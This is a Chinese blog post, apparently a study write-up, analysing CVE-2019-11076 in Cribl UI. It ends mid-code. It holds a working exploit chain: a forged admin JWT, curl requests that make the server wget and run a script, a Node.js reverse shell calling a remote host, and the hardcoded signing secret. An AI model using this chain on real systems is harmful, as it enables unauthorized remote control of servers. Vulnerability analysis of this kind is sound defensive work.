@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言每天一小步，进步一大步。CVE-2019-11076 Cribl UI 1.5.0未授权命令执行漏洞分析 背景12345678已在Cribl v1.5.0上进行了测试-先前版本未经过测试，但可能容易受到攻击。可以从另一个Cribl实例的会话中转移有效的JWT令牌并将其注入到该会话中，从而为用户提供未经授权的访问权限。此外，用于生成JWT / Session的加密密钥可用于为任何用户名创建有效的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="读书日记十一">
+<meta property="og:url" content="http://yoursite.com/2020/02/09/读书日记十一/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言每天一小步，进步一大步。CVE-2019-11076 Cribl UI 1.5.0未授权命令执行漏洞分析 背景12345678已在Cribl v1.5.0上进行了测试-先前版本未经过测试，但可能容易受到攻击。可以从另一个Cribl实例的会话中转移有效的JWT令牌并将其注入到该会话中，从而为用户提供未经授权的访问权限。此外，用于生成JWT / Session的加密密钥可用于为任何用户名创建有效的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-1.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-2.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-3.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-4.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-5.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-6.PNG">
+<meta property="og:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-7.PNG">
+<meta property="og:updated_time" content="2020-02-09T12:09:13.177Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="读书日记十一">
+<meta name="twitter:description" content="前言每天一小步，进步一大步。CVE-2019-11076 Cribl UI 1.5.0未授权命令执行漏洞分析 背景12345678已在Cribl v1.5.0上进行了测试-先前版本未经过测试，但可能容易受到攻击。可以从另一个Cribl实例的会话中转移有效的JWT令牌并将其注入到该会话中，从而为用户提供未经授权的访问权限。此外，用于生成JWT / Session的加密密钥可用于为任何用户名创建有效的">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-1.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/09/读书日记十一/">
+
+
+
+
+
+  <title>读书日记十一 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/读书日记十一/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">读书日记十一</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T20:08:00+08:00">
+                2020-02-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/读书日记/" itemprop="url" rel="index">
+                    <span itemprop="name">读书日记</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/读书日记/javascript/" itemprop="url" rel="index">
+                    <span itemprop="name">javascript</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  2.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  11
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>每天一小步，进步一大步。CVE-2019-11076 Cribl UI 1.5.0未授权命令执行漏洞分析</p>
+<h5 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">已在Cribl v1.5.0上进行了测试-先前版本未经过测试，但可能容易受到攻击。</span><br><span class="line">可以从另一个Cribl实例的会话中转移有效的JWT令牌并将其注入到该会话中，从而为用户提供未经授权的访问权限。</span><br><span class="line">此外，用于生成JWT / Session的加密密钥可用于为任何用户名创建有效的会话，且有效期延长。</span><br><span class="line"></span><br><span class="line">结合使用在Cribl中运行脚本的功能，远程攻击者可以在Crible实例上运行恶意代码，以获得进一步的控制。</span><br><span class="line">可以在下面看到这样的示例，使用脚本页面和有效期很长的JWT令牌，可以创建反向外壳。</span><br><span class="line"></span><br><span class="line">使用Docker（Alpine）进行了测试。</span><br></pre></td></tr></table></figure>
+
+<h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h6 id="根据作者的描述，该问题在1-5-0上被验证存在，之前的版本不排除有该问题，但作者尚未验证，因此这里使用1-4-3的环境进行测试："><a href="#根据作者的描述，该问题在1-5-0上被验证存在，之前的版本不排除有该问题，但作者尚未验证，因此这里使用1-4-3的环境进行测试：" class="headerlink" title="根据作者的描述，该问题在1.5.0上被验证存在，之前的版本不排除有该问题，但作者尚未验证，因此这里使用1.4.3的环境进行测试："></a>根据作者的描述，该问题在1.5.0上被验证存在，之前的版本不排除有该问题，但作者尚未验证，因此这里使用1.4.3的环境进行测试：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># pull docker</span><br><span class="line">docker pull cribl/cribl:1.4.3</span><br><span class="line"># run docker</span><br><span class="line">docker run -p 9000:9000 -d cribl/cribl:1.4.3</span><br></pre></td></tr></table></figure>
+
+<h6 id="然后访问-9000-端口，可以看到如下页面，使用-admin-admin-即可登录："><a href="#然后访问-9000-端口，可以看到如下页面，使用-admin-admin-即可登录：" class="headerlink" title="然后访问 9000 端口，可以看到如下页面，使用 admin/admin 即可登录："></a>然后访问 9000 端口，可以看到如下页面，使用 admin/admin 即可登录：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-1.PNG" alt></p>
+<h5 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h5><h6 id="根据作者的描述，该漏洞属于任意命令执行的漏洞，但由于没有回显，需要通过反弹-shell-的方式获得可以交互的命令行。考虑到-cribl-本身具有-nodejs-环境，因此可以考虑结合-nodejs-的反弹-shell-脚本进行攻击。"><a href="#根据作者的描述，该漏洞属于任意命令执行的漏洞，但由于没有回显，需要通过反弹-shell-的方式获得可以交互的命令行。考虑到-cribl-本身具有-nodejs-环境，因此可以考虑结合-nodejs-的反弹-shell-脚本进行攻击。" class="headerlink" title="根据作者的描述，该漏洞属于任意命令执行的漏洞，但由于没有回显，需要通过反弹 shell 的方式获得可以交互的命令行。考虑到 cribl 本身具有 nodejs 环境，因此可以考虑结合 nodejs 的反弹 shell 脚本进行攻击。"></a>根据作者的描述，该漏洞属于任意命令执行的漏洞，但由于没有回显，需要通过反弹 shell 的方式获得可以交互的命令行。考虑到 cribl 本身具有 nodejs 环境，因此可以考虑结合 nodejs 的反弹 shell 脚本进行攻击。</h6><h6 id="因此，漏洞的利用思路如下："><a href="#因此，漏洞的利用思路如下：" class="headerlink" title="因此，漏洞的利用思路如下："></a>因此，漏洞的利用思路如下：</h6><h6 id="1-使用-wget-或其他方式将反弹-shell-的脚本写入受影响的环境"><a href="#1-使用-wget-或其他方式将反弹-shell-的脚本写入受影响的环境" class="headerlink" title="1.使用 wget 或其他方式将反弹 shell 的脚本写入受影响的环境"></a>1.使用 wget 或其他方式将反弹 shell 的脚本写入受影响的环境</h6><h6 id="2-利用-nodejs-执行该脚本，反弹-shell"><a href="#2-利用-nodejs-执行该脚本，反弹-shell" class="headerlink" title="2.利用 nodejs 执行该脚本，反弹 shell"></a>2.利用 nodejs 执行该脚本，反弹 shell</h6><h6 id="第一步，先在自己的-vps-上部署-nodejs-的反弹-shell-脚本（这里需要将YOUR-REMOTE-IP-OR-FQDN-替换为具体的地址或域名）："><a href="#第一步，先在自己的-vps-上部署-nodejs-的反弹-shell-脚本（这里需要将YOUR-REMOTE-IP-OR-FQDN-替换为具体的地址或域名）：" class="headerlink" title="第一步，先在自己的 vps 上部署 nodejs 的反弹 shell 脚本（这里需要将YOUR_REMOTE_IP_OR_FQDN 替换为具体的地址或域名）："></a>第一步，先在自己的 vps 上部署 nodejs 的反弹 shell 脚本（这里需要将<code>YOUR_REMOTE_IP_OR_FQDN</code> 替换为具体的地址或域名）：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">"net"</span>), sh = <span class="built_in">require</span>(<span class="string">"child_process"</span>).exec(<span class="string">"/bin/sh"</span>);</span><br><span class="line"><span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket();</span><br><span class="line">client.connect(<span class="number">6669</span>, <span class="string">"YOUR_REMOTE_IP_OR_FQDN"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);</span><br><span class="line">sh.stderr.pipe(client);&#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="然后准备好监听6669端口"><a href="#然后准备好监听6669端口" class="headerlink" title="然后准备好监听6669端口"></a>然后准备好监听6669端口</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 6669</span><br></pre></td></tr></table></figure>
+
+<h6 id="下一步就是使用任意命令执行的漏洞，先利用wget下载反弹shell的脚本："><a href="#下一步就是使用任意命令执行的漏洞，先利用wget下载反弹shell的脚本：" class="headerlink" title="下一步就是使用任意命令执行的漏洞，先利用wget下载反弹shell的脚本："></a>下一步就是使用任意命令执行的漏洞，先利用wget下载反弹shell的脚本：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># wget</span><br><span class="line">curl &apos;http://192.168.220.154:9000/api/v1/system/scripts&apos; \</span><br><span class="line">-H &apos;Content-Type: application/json&apos; \</span><br><span class="line">-H &apos;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&apos; \</span><br><span class="line">--data-binary &apos;&#123;&quot;id&quot;:&quot;runme&quot;,&quot;command&quot;:&quot;/usr/bin/wget&quot;,&quot;args&quot;:[&quot;http://192.168.220.157:8302/php_file/shell.js&quot;,&quot;-P&quot;,&quot;/opt&quot;],&quot;env&quot;:&#123;&#125;&#125;&apos; --compressed</span><br><span class="line"></span><br><span class="line"># &#123;&quot;count&quot;:1,&quot;items&quot;:[&#123;&quot;command&quot;:&quot;/usr/bin/wget&quot;,&quot;args&quot;:[&quot;http://192.168.220.157:8302/php_file/shell.js&quot;,&quot;-P&quot;,&quot;/opt&quot;],&quot;env&quot;:&#123;&#125;,&quot;id&quot;:&quot;runme&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># exec wget</span><br><span class="line">curl &apos;http://192.168.220.154:9000/api/v1/system/scripts/runme/run&apos; \</span><br><span class="line">-H &apos;Content-Type: application/json&apos; \</span><br><span class="line">-H &apos;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&apos; \</span><br><span class="line">--data-binary &apos;&#123;&#125;&apos; --compressed</span><br><span class="line"></span><br><span class="line"># &#123;&quot;pid&quot;:29,&quot;stdout&quot;:&quot;N/A&quot;,&quot;stderr&quot;:&quot;N/A&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># nodejs</span><br><span class="line">curl &apos;http://192.168.220.154:9000/api/v1/system/scripts&apos; \</span><br><span class="line"> -H &apos;Content-Type: application/json&apos;\</span><br><span class="line"> -H &apos;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&apos; \</span><br><span class="line">--data-binary &apos;&#123;&quot;id&quot;:&quot;reverseit&quot;,&quot;command&quot;:&quot;node&quot;,&quot;args&quot;:[&quot;/opt/shell.js&quot;],&quot;env&quot;:&#123;&#125;&#125;&apos; --compressed</span><br><span class="line"></span><br><span class="line"># &#123;&quot;count&quot;:1,&quot;items&quot;:[&#123;&quot;command&quot;:&quot;node&quot;,&quot;args&quot;:[&quot;/opt/shell.js&quot;],&quot;env&quot;:&#123;&#125;,&quot;id&quot;:&quot;reverseit&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># exec nodejs</span><br><span class="line">curl &apos;http://192168.220.154:9000/api/v1/system/scripts/reverseit/run&apos; \</span><br><span class="line">-H &apos;Cookie: cribl_auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.lnXNKawtPIvfUR8D6RzrU5U1-_AHuPP1StShu4XiIFY&apos; \</span><br><span class="line">--data-binary &apos;&#123;&#125;&apos; --compressed</span><br><span class="line"></span><br><span class="line"># &#123;&quot;pid&quot;:37,&quot;stdout&quot;:&quot;N/A&quot;,&quot;stderr&quot;:&quot;N/A&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="成功反弹-shell："><a href="#成功反弹-shell：" class="headerlink" title="成功反弹 shell："></a>成功反弹 shell：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-2.PNG" alt></p>
+<h6 id="PS：原作者-poc-中有一个很奇怪的地方，第二次未授权访问的时候使用了一个错误的-Cookie…"><a href="#PS：原作者-poc-中有一个很奇怪的地方，第二次未授权访问的时候使用了一个错误的-Cookie…" class="headerlink" title="PS：原作者 poc 中有一个很奇怪的地方，第二次未授权访问的时候使用了一个错误的 Cookie…"></a>PS：原作者 poc 中有一个很奇怪的地方，第二次未授权访问的时候使用了一个错误的 Cookie…</h6><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><h6 id="下面来看继续分析这个漏洞的成因，可以看到任意命令执行是该应用自带的功能。访问http-192-168-220-154-9000-settings-scripts可以看到之前-poc-所生成的两项："><a href="#下面来看继续分析这个漏洞的成因，可以看到任意命令执行是该应用自带的功能。访问http-192-168-220-154-9000-settings-scripts可以看到之前-poc-所生成的两项：" class="headerlink" title="下面来看继续分析这个漏洞的成因，可以看到任意命令执行是该应用自带的功能。访问http://192.168.220.154:9000/settings/scripts可以看到之前 poc 所生成的两项："></a>下面来看继续分析这个漏洞的成因，可以看到任意命令执行是该应用自带的功能。访问<code>http://192.168.220.154:9000/settings/scripts</code>可以看到之前 poc 所生成的两项：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-3.PNG" alt></p>
+<h6 id="如果我们使用授权的admin-admin账号，可以直接增加并执行命令："><a href="#如果我们使用授权的admin-admin账号，可以直接增加并执行命令：" class="headerlink" title="如果我们使用授权的admin/admin账号，可以直接增加并执行命令："></a>如果我们使用授权的<code>admin/admin</code>账号，可以直接增加并执行命令：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-4.PNG" alt></p>
+<p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-5.PNG" alt></p>
+<h6 id="所以该漏洞的主要问题在于未授权，即未登陆的状态下也可以利用伪造的-JWT-token进行任意命令执行。"><a href="#所以该漏洞的主要问题在于未授权，即未登陆的状态下也可以利用伪造的-JWT-token进行任意命令执行。" class="headerlink" title="所以该漏洞的主要问题在于未授权，即未登陆的状态下也可以利用伪造的 JWT token进行任意命令执行。"></a>所以该漏洞的主要问题在于未授权，即未登陆的状态下也可以利用伪造的 JWT token进行任意命令执行。</h6><h6 id="下面结合源码来分析漏洞所在。可以看到文件夹结构如下："><a href="#下面结合源码来分析漏洞所在。可以看到文件夹结构如下：" class="headerlink" title="下面结合源码来分析漏洞所在。可以看到文件夹结构如下："></a>下面结合源码来分析漏洞所在。可以看到文件夹结构如下：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-6.PNG" alt></p>
+<h6 id="结合docker的entrypoint-sh："><a href="#结合docker的entrypoint-sh：" class="headerlink" title="结合docker的entrypoint.sh："></a>结合<code>docker</code>的<code>entrypoint.sh</code>：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Assumed to be an s3 location</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$CRIBL_CONFIG_LOCATION</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">    aws s3 sync <span class="string">"<span class="variable">$CRIBL_CONFIG_LOCATION</span>"</span> /opt/cribl/<span class="built_in">local</span>/cribl</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$CRIBL_SCRIPTS_LOCATION</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">    mkdir -p /opt/cribl/scripts</span><br><span class="line">    aws s3 sync <span class="string">"<span class="variable">$CRIBL_SCRIPTS_LOCATION</span>"</span> /opt/cribl/scripts</span><br><span class="line">    chmod -R 755 /opt/cribl/scripts</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$1</span>"</span> = <span class="string">"cribl"</span> ]; <span class="keyword">then</span></span><br><span class="line">    node /opt/cribl/bin/cribl.bundle.js server</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="以及start-sh"><a href="#以及start-sh" class="headerlink" title="以及start.sh:"></a>以及<code>start.sh</code>:</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">NODECMD=node</span><br><span class="line">STARTCMD=<span class="string">"<span class="variable">$NODECMD</span> cribl.bundle.js server"</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"<span class="variable">$STARTCOMD</span>"</span></span><br><span class="line"></span><br><span class="line">DIR=<span class="string">"<span class="variable">$( cd "$( dirname "$&#123;BASH_SOURCE[0]&#125;" )</span>"</span> &amp;&amp; <span class="built_in">pwd</span> )<span class="string">"</span></span><br><span class="line"><span class="string">cd <span class="variable">$DIR</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># exec the command so it can receive kill signals</span></span><br><span class="line"><span class="string">exec <span class="variable">$STARTCMD</span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="可以看到最核心的代码为cribl-bundle-js，进入分析："><a href="#可以看到最核心的代码为cribl-bundle-js，进入分析：" class="headerlink" title="可以看到最核心的代码为cribl.bundle.js，进入分析："></a>可以看到最核心的代码为<code>cribl.bundle.js</code>，进入分析：</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/2020-2-6-cribl-1.4.3-7.PNG" alt></p>
+<h6 id="可以很明显看到该代码是由webpack之类工具打包生成的了。。第一眼看上去一头雾水那么就需要结合一定的技巧进行分析，可以搜索关键词cribl-auth，因为Cookie中的cribl-auth字段即JWT-token，定位到下图的关键代码："><a href="#可以很明显看到该代码是由webpack之类工具打包生成的了。。第一眼看上去一头雾水那么就需要结合一定的技巧进行分析，可以搜索关键词cribl-auth，因为Cookie中的cribl-auth字段即JWT-token，定位到下图的关键代码：" class="headerlink" title="可以很明显看到该代码是由webpack之类工具打包生成的了。。第一眼看上去一头雾水那么就需要结合一定的技巧进行分析，可以搜索关键词cribl_auth，因为Cookie中的cribl_auth字段即JWT token，定位到下图的关键代码："></a>可以很明显看到该代码是由<code>webpack</code>之类工具打包生成的了。。第一眼看上去一头雾水那么就需要结合一定的技巧进行分析，可以搜索关键词<code>cribl_auth</code>，因为Cookie中的<code>cribl_auth</code>字段即<code>JWT token</code>，定位到下图的关键代码：</h6><h6 id="美化之后如下："><a href="#美化之后如下：" class="headerlink" title="美化之后如下："></a>美化之后如下：</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="string">"d2hvIGxldCB0aGUgZG9ncyBvdXQ="</span>;</span><br><span class="line"><span class="keyword">var</span> p = <span class="number">4</span> * <span class="number">3600</span>;</span><br><span class="line"><span class="keyword">var</span> h = <span class="string">"cribl_auth"</span>;</span><br><span class="line"><span 